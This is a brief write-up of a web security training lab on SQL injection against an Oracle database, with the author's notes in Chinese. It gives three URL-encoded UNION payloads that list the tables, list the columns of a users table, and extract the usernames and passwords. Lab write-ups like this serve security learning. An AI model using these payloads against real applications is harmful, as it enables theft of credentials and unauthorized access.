# Lab: SQL injection attack, listing the database contents on Oracle

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

## SQL injection
* 注入點在 `category`
* 題目說用的資料庫是 `Oracle`
* 一樣要拿到 username 跟 password
```
// 拿所有的 tables
payload = %27%20union%20select%20owner,%20table_name%20FROM%20all_tables%20--%20-
```
```
// 查 USERS_SZREHM 有哪些 columns
payload = %27%20union%20select%20owner,%20column_name%20FROM%20all_tab_columns%20WHERE%20table_name%20=%20%27USERS_SZREHM%27%20--%20-
```
```
// 拿 username password
payload = %27%20union%20select%20USERNAME_WBBWGY,PASSWORD_FWRCSQ%20FROM%20USERS_SZREHM%20--%20-
```